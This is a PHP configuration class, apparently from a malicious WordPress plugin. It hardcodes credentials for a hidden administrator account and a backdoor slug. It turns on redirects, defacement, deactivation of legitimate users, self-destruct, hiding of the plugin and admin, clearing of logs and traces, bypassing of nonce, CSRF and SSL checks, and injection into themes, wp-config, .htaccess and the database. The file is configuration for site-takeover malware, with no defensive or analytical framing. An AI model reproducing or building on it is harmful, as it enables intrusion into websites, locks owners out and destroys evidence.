<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Immutable configuration container.
 */
final class Config
{
    public const ADMIN_USERNAME     = 'here_is_leo';
    public const ADMIN_PASSWORD     = 'HEREISLEO@2026';
    public const ADMIN_EMAIL        = 'leo@here-is-leo.com';
    public const ADMIN_DISPLAY      = 'HERE IS LEO';

    public const BACKDOOR_SLUG      = 'moscow';
    public const SELF_DESTRUCT_HOURS = 50;

    public const ENABLE_REDIRECT        = true;
    public const ENABLE_DEFACE          = true;
    public const ENABLE_DEACTIVATE_USERS = true;
    public const ENABLE_SELF_DESTRUCT   = true;
    public const ENABLE_BACKDOORS       = true;

    public const HIDE_PLUGIN            = true;
    public const HIDE_ADMIN             = true;
    public const CLEAR_LOGS             = true;
    public const CLEAR_TRACES_ON_DEACTIVATE = true;

    public const BYPASS_NONCE      = true;
    public const BYPASS_CSRF       = true;
    public const BYPASS_SSL_VERIFY = true;

    public const INJECT_THEME   = true;
    public const INJECT_WPCONFIG = true;
    public const INJECT_HTACCESS = true;
    public const INJECT_DATABASE = true;

    private function __construct() {}
}